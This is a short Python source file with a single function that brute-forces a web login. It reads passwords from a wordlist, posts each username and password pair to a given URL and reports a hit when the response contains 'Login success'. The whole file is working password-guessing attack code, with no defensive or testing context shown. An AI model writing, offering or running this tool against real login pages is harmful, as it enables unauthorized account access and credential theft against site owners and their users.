import requests

def brute_force_web(url, username, wordlist_path):
    results = []

    try:
        with open(wordlist_path, 'r') as file:
            passwords = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        return ["❌ Wordlist file not found."]
    except Exception as e:
        return [f"❌ Error reading wordlist: {str(e)}"]

    for password in passwords:
        try:
            res = requests.post(url, data={
                "username": username,
                "password": password
            }, headers={"User-Agent": "python-brute"}, timeout=5)

            if "Login success" in res.text:
                results.append(f"✅ Found: {username}:{password}")
                break
            else:
                results.append(f"❌ {username}:{password} - Failed")
        except requests.Timeout:
            results.append(f"⏱️ Timeout for {password}")
        except Exception as e:
            results.append(f"⚠️ Error with {password}: {str(e)}")

    if not any("✅" in r for r in results):
        results.append("🔍 No valid password found.")

    return results
